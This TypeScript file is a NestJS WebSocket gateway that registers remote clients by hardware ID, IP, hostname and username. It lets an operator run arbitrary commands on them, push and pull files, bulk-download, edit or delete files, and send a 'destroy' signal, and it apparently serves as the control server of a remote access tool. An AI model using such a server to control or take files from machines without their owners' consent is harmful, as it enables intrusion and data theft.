import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  OnGatewayInit,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from '@nestjs/websockets';
import { Server, Socket } from 'socket.io';
import { Client } from './entities/client.entity';
import { ClientService } from './client.service';
import { ConflictException, forwardRef, Inject } from '@nestjs/common';
import * as path from 'path';
import * as fs from 'fs';
import * as fse from 'fs-extra';

@WebSocketGateway({ maxHttpBufferSize: 2e9 })
export class ClientGateway
  implements OnGatewayInit, OnGatewayConnection, OnGatewayDisconnect
{
  @WebSocketServer()
  server: Server;

  private clients: Map<string, Socket> = new Map();
  constructor(
    @Inject(forwardRef(() => ClientService))
    private clientService: ClientService,
  ) {}

  afterInit() {
    console.log('WebSocket Server initialized');
  }

  handleConnection(client: Socket) {
    console.log('Client connected:', client.id);
  }

  handleDisconnect(client: Socket) {
    console.log(`Client disconnected: ${client.id}`);
    this.clients.forEach((value, key) => {
      if (value.id === client.id) {
        this.clients.delete(key);
      }
    });
  }

  //Main functions

  @SubscribeMessage('register')
  handleRegister(client: Socket, data: Client) {
    console.log(`Received register event:`, data);

    if (
      !data ||
      !data.hwid ||
      !data.ip ||
      !data.os ||
      !data.hostname ||
      !data.username
    ) {
      console.error('Invalid register data:', data);
      return;
    }

    this.clientService.registerClient(data);

    this.clients.set(data.hwid, client);
    console.log(`Client ${data.hwid} registered with socket ID: ${client.id}`);
  }

  destroyConnection(hwid: string) {
    const clientSocket = this.clients.get(hwid);
    if (clientSocket) {
      clientSocket.emit('destroy');
      clientSocket.disconnect();
      this.clients.delete(hwid);
    } else {
      throw new ConflictException('Client not connected');
    }
  }

  sendCommandToClient(
    client: Client,
    command: string,
    callback: (response: string) => void,
  ) {
    const clientSocket = this.clients.get(client.hwid);

    if (!clientSocket) throw new ConflictException('Client not connected');

    clientSocket.once('commandResponse', (data) => {
      callback(data);
    });

    clientSocket.emit('sendCommand', command);
  }

  uploadFileToClient(client: Client, filename: string, destination: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    const filePath = path.join(this.clientService.uploadPath, filename);
    const fileBuffer = fs.readFileSync(filePath);

    return new Promise((resolve, reject) => {
      clientSocket.emit('receiveFile', { filename, fileBuffer, destination });
      clientSocket.once('receiveFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          if (data.message.includes('Destination')) {
            reject(new ConflictException(data.message));
          } else {
            reject(new ConflictException('There was an error while uploading'));
          }
        }
      });
    });
  }

  downloadFileFromClient(client: Client, filePath: string, filename: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise<Buffer>((resolve, reject) => {
      clientSocket.emit('requestFile', { filePath, filename });
      clientSocket.once('requestFileResponse', async (data) => {
        if (data.status && data.fileBuffer) {
          try {
            await fse.ensureDir(this.clientService.downloadPath);

            const saveFilename =
              filename === '*'
                ? this.clientService.massDownloadZipName
                : filename;
            const saveFilePath = path.join(
              this.clientService.downloadPath,
              saveFilename,
            );

            //Check if the file is bigger than the max file size
            if (data.fileBuffer.length > this.clientService.maxFileSize) {
              reject(new ConflictException('File is too large.'));
              return;
            }

            fs.writeFileSync(saveFilePath, data.fileBuffer);
            resolve(data.fileBuffer);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException('File not found or other error'));
        }
      });
    });
  }

  createFile(client: Client, filePath: string, content: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('createFile', { filePath, content });
      clientSocket.once('createFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException('There was an error while uploading'));
        }
      });
    });
  }

  readFile(client: Client, filePath: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('readFile', { filePath });
      clientSocket.once('readFileResponse', async (data) => {
        if (data.status && data.content) {
          try {
            resolve(data.content);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(new ConflictException('Failed to read file.'));
          }
        } else {
          reject(new ConflictException('File not found or other error'));
        }
      });
    });
  }

  updateFile(client: Client, filePath: string, content: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('updateFile', { filePath, content });
      clientSocket.once('updateFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException('There was an error while uploading'));
        }
      });
    });
  }

  deleteFile(client: Client, filePath: string) {
    const clientSocket = this.clients.get(client.hwid);
    if (!clientSocket) throw new ConflictException('Client not connected');

    return new Promise((resolve, reject) => {
      clientSocket.emit('deleteFile', { filePath });
      clientSocket.once('deleteFileResponse', async (data) => {
        if (data.status) {
          try {
            resolve(data);
          } catch (error) {
            console.log('Try catch error: ', error);
            reject(
              new ConflictException('Failed to save file after receiving.'),
            );
          }
        } else {
          reject(new ConflictException('There was an error while uploading'));
        }
      });
    });
  }
}
